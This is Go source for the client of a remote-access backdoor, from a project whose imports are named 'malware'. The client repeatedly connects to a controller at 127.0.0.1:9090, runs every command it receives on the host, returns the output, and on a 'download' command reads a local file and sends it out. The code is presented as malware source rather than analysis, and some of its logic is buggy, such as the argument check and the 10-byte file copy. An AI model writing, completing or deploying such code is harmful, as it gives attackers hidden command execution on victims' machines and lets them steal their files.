package main

//Client

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	network "malware/core/Network"
	platforms "malware/core/Platforms"
	utils "malware/core/Utils"
	"malware/models"
	"net"
	"os"
	"strings"
	"time"
)

func main() {

	var conn net.Conn

	IP := "127.0.0.1"
	Port := "9090"
begin:
	conn, err := network.ConnectionWithServer(IP, Port)
	if err != nil {
		time.Sleep(time.Minute * 1)
		goto begin
	}

	defer conn.Close()

	var userInput string
	resCmd := platforms.Run("pwd")
	utils.Encode(conn, resCmd)
	for {
		reader := bufio.NewReader(conn)
		userInput, err = reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		strCommand := strings.TrimSuffix(userInput, "\n")
		userCommand := strings.Split(strCommand, " ")

		if userCommand[0] == "download" {
			if len(userCommand) < 1 {
				continue
			}
			// fmt.Println("file should be uploaded")
			// //utils.Encode(conn, &models.Command{Data: []byte("hello world")})
			// core.UploadFile(conn, userCommand[2])
			file, err := os.Open(userCommand[1])
			if err != nil {
				panic(err)
			}
			fileInfo, err := file.Stat()
			if err != nil {
				panic(err)
			}

			fileData, err := io.ReadAll(file)
			if err != nil {
				panic(err)
			}
			fmt.Println("file size : ", fileInfo)
			fileSize := fileInfo.Size()
			fileName := fileInfo.Name()

			resCmd := &models.Command{
				Lenght: fileSize,
				Data:   []byte(fileName),
			}
			utils.Encode(conn, resCmd)

			_, err = io.CopyN(conn, bytes.NewReader(fileData), 10)

			if err != nil {
				panic(err)
			}
			continue

		}

		if userCommand[0] == "cd" {
			if userCommand[1] == "" {
				userCommand[1] = "/"
			}
			os.Chdir(userCommand[1])
			userCommand[0] = "pwd"
		}

		resCmd := platforms.Run(userCommand[0], userCommand[1:]...)

		utils.Encode(conn, resCmd)
	}
}
